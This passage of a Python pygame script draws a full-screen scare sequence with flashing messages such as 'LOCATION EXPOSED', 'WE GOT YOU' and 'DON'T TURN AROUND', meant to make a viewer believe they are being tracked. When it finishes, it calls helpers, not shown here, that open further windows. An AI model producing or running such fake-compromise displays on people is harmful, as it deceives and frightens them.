        scene_duration = SCENE_DURATIONS[scene_index]
        scene_time = self.phase - scene_start
        profile = PROFILES[scene_index]
        compact = self.width < 900
        self.draw_background(delta, profile)

        final_reveal = scene_index == 2 and scene_time > 3.3
        headlines = ("SIGNAL DETECTED", "LOCATION EXPOSED",
                     "DON'T TURN AROUND" if final_reveal else "WE GOT YOU")
        sublines = (
            "UNKNOWN DEVICE CONNECTED",
            "YOUR POSITION IS NO LONGER PRIVATE",
            "THERE IS NOWHERE LEFT TO HIDE",
        )
        title_size = max(27, min(48, int(self.height * 0.058)))
        pulse = 0.72 + 0.28 * abs(math.sin(self.phase * (2.8 if scene_index == 2 else 1.4)))
        title_color = (int(255 * pulse), int(220 * pulse), int(214 * pulse))
        self.draw_text(headlines[scene_index], (self.width // 2, int(self.height * 0.105)),
                       title_size, title_color, True)
        if not final_reveal:
            self.draw_text(sublines[scene_index], (self.width // 2, int(self.height * 0.155)),
                           11, (177, 116, 119), True)
            self.draw_identity(profile, scene_index, compact)
        center = self.scene_center(compact)

        if scene_index == 0:
            self.draw_server_scene(center)
        elif scene_index == 1:
            self.draw_code_scene(center, scene_time)
        else:
            self.draw_portal_scene(center, scene_time)

        self.draw_horror_overlay(scene_index, scene_time)
        self.draw_signal_warning(scene_index, scene_time)
        self.draw_vignette(scene_index, scene_time)
        alert_color = (255, 28, 34) if int(self.phase * 0.65) % 2 else (74, 8, 16)
        pygame.draw.circle(self.screen, alert_color, (30, 34), 5)
        self.draw_text("LIVE", (70, 34), 11, (221, 151, 148), True)

        dots_y = self.height - 32
        for dot_index, item in enumerate(PROFILES):
            color = rgb(item["color"]) if dot_index == scene_index else (45, 57, 65)
            pygame.draw.circle(self.screen, color,
                               (self.width // 2 + (dot_index - 1) * 18, dots_y),
                               4 if dot_index == scene_index else 2)

        fade_duration = 0.45
        fade = min(1.0, scene_time / fade_duration, (scene_duration - scene_time) / fade_duration)
        if fade < 1.0:
            overlay = pygame.Surface((self.width, self.height))
            overlay.fill((0, 0, 0))
            overlay.set_alpha(int((1.0 - fade) * 255))
            self.screen.blit(overlay, (0, 0))

        self.phase += delta * 2.4

    def run(self):
        """Run the frame loop until the sequence finishes or Escape is pressed."""
        sequence_finished = False
        while self.running:
            delta = min(self.clock.tick(60) / 1000.0, 0.05)
            for event in pygame.event.get():
                if event.type == pygame.QUIT or (
                    event.type == pygame.KEYDOWN and event.key == pygame.K_ESCAPE
                ):
                    self.running = False
            self.collect_avatars()
            self.draw(delta)
            pygame.display.flip()
            if self.phase >= sum(SCENE_DURATIONS):
                sequence_finished = True
                self.running = False
        pygame.quit()
        if sequence_finished:
            start_monitor_windows()


if __name__ == "__main__":
    WeGotYou().run()